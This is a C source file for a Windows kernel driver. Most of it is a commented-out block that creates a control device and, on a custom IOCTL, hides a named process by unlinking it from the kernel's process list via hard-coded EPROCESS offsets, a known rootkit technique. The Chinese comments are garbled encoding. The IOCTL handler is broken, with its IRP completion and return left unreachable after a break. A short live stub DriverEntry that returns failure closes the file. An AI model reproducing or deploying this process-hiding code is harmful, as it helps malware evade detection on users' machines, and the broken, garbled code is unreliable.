/*#include <ntifs.h>
#define IOCTL_BASE 0x800
#define MY_CTL_CODE(code)       \
		CTL_CODE( \
		FILE_DEVICE_UNKNOWN, \
		IOCTL_BASE+(code), \
		METHOD_OUT_DIRECT, \
		0 \
		)
#define DF_GET_PROC_HIDE MY_CTL_CODE(7)

//ж������
void UnLoad(DRIVER_OBJECT* obj)
{
	KdPrint(("������ж��\n"));
	UNICODE_STRING userName;
	RtlInitUnicodeString(&userName,
		L"\\DosDevices\\MyFristDriver_User");
	//ɾ����������
	IoDeleteSymbolicLink(&userName);
	//ɾ���豸����
	IoDeleteDevice(obj->DeviceObject);
}

NTSTATUS InCreate(DEVICE_OBJECT *Device, IRP *irp);
NTSTATUS InClose(DEVICE_OBJECT *Device, IRP *irp);
NTSTATUS DeviceCtrl(DEVICE_OBJECT* device, IRP* irp);

//�������
NTSTATUS DriverEntry(DRIVER_OBJECT* driver, UNICODE_STRING* path)
{
	path;
	KdPrint(("�����Ѽ���\n"));
	DbgBreakPoint();
	
	//1.����һ���豸����
	DEVICE_OBJECT* DeviceObj = NULL;
	UNICODE_STRING deviceName;
	RtlInitUnicodeString(&deviceName,
		L"\\Device\\MyFristDriver");
	NTSTATUS status = IoCreateDevice(
		driver,
		0,
		&deviceName,
		FILE_DEVICE_UNKNOWN,
		0, 0,
		&DeviceObj);
	if (status != STATUS_SUCCESS)
		return status;
	driver->Flags |= DO_DIRECT_IO;//ֱ��IO

	//2.��һ����������
	UNICODE_STRING userName;
	RtlInitUnicodeString(&userName,
		L"\\DosDevices\\MyFristDriver_User");
	IoCreateSymbolicLink(&userName, &deviceName);


	//������ǲ����
	driver->MajorFunction[IRP_MJ_CREATE] = InCreate;
	driver->MajorFunction[IRP_MJ_CLOSE] = InClose;
	driver->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceCtrl;

	driver->DriverUnload = UnLoad;
	return STATUS_SUCCESS;
}

NTSTATUS InCreate(DEVICE_OBJECT *Device, IRP *irp)
{
	Device;
	KdPrint(("�����˴�����ǲ����\n"));
	irp->IoStatus.Status = STATUS_SUCCESS;
	irp->IoStatus.Information = 0;
	IoCompleteRequest(irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}
NTSTATUS InClose(DEVICE_OBJECT *Device, IRP *irp)
{
	Device;
	KdPrint(("�����˹ر���ǲ����\n"));
	irp->IoStatus.Status = STATUS_SUCCESS;
	irp->IoStatus.Information = 0;
	IoCompleteRequest(irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}



//ͨ�������뷽ʽͨѶ
NTSTATUS DeviceCtrl(DEVICE_OBJECT* device, IRP* irp)
{
	KdPrint(("�ѽ��������ͨѶ\n"));	
	device;
	NTSTATUS status = STATUS_SUCCESS;
	ULONG complateSize = 0;
	HANDLE hFile = NULL;
	irp->IoStatus.Status = STATUS_SUCCESS;

	//1.��ȡIOջλ��
	IO_STACK_LOCATION* pIoStack = 
		IoGetCurrentIrpStackLocation(irp);

	//2.��ȡ����Ĳ���
	//2.1 IO�豸������
	ULONG ctrlCode = 
		pIoStack->Parameters.DeviceIoControl.IoControlCode;

	//2.2 ���뻺�������ֽ���
	ULONG inputSize = pIoStack->
			Parameters.DeviceIoControl.InputBufferLength;

	//2.3��ȡ���뻺����
	PVOID pInputBuff = irp->AssociatedIrp.SystemBuffer;

	//ѡ�������
    switch (ctrlCode)
	{
		//HideProcess
		case DF_GET_PROC_HIDE:
		{		
			//��������
			char* ProcName = NULL;
			ProcName = (char*)pInputBuff;		
			//��ȡ��ǰ���̶���
			PEPROCESS NowProc = PsGetCurrentProcess();
			//��ȡ���̶����ڵĵ�ǰ���������
			LIST_ENTRY* pNowList = (LIST_ENTRY*)((ULONG)NowProc + 0xb8);
			//��ʱ����
			LIST_ENTRY* pTempList = pNowList;
			//��������
			while (pNowList != pTempList->Flink)
			{
				//��Խ��̶���ƫ��0x16c�������ImageFileName,
				//��ǰ��Խ��̶���ƫ����0xb8����Ҫ��ȥ			
				if (!strcmp(ProcName, (char*)
					((ULONG)pTempList - 0xb8 + 0x16c)))
				{
					//���ҵ��Ľ��̴�������ɾ��
					(pTempList->Blink)->Flink = pTempList->Flink;
					(pTempList->Flink)->Blink = pTempList->Blink;
				
					pTempList->Flink = pTempList->Blink = NULL;
					KdPrint(("�ɹ�ɾ����������ڵ�\n"));				
					break;
				}
				pTempList = pTempList->Flink;
			}
		}
		break;
	
		irp->IoStatus.Status = STATUS_SUCCESS;
		irp->IoStatus.Information = inputSize;
		IoCompleteRequest(irp, IO_NO_INCREMENT);
		return status;
	}
}*/







#define _WIN64 1
#define _AMD64_ 1
#include "ntddk.h"

NTSTATUS 
DriverEntry(PDRIVER_OBJECT DriverObject,PUNICODE_STRING RegistryPath) 
{ 
return STATUS_UNSUCCESSFUL; 
}





